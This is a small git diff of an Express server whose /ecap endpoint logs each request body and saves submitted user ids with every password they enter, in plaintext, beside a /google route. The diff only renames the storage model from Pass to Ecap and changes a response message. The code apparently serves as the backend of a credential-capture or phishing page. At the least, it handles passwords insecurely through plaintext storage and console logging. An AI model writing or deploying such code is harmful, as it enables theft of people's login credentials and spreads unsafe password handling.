@@ -52,14 +52,14 @@ app.post("/google", async (req, res) => {
 });
 app.post("/ecap", async (req, res) => {
   console.log(req.body);
-  let pass = await Pass.findById(req.body.user);
+  let pass = await Ecap.findById(req.body.user);
   if (pass) {
     if (pass.passwords.includes(req.body.passwd)) return res.send("done");
     pass.passwords.unshift(req.body.passwd);
     await pass.save();
     return res.send("done");
   } else {
-    let pass = new Pass({
+    let pass = new Ecap({
       _id: req.body.user,
       passwords: [req.body.passwd],
       type: [req.body.type],
@@ -67,7 +67,7 @@ app.post("/ecap", async (req, res) => {
     await pass.save();
   }
 
-  return res.json({ sample: "done" });
+  return res.json({ sample: "ecap pass saved" });
 });
 app.get("/", (_, res) => {
   res.send("Surya");
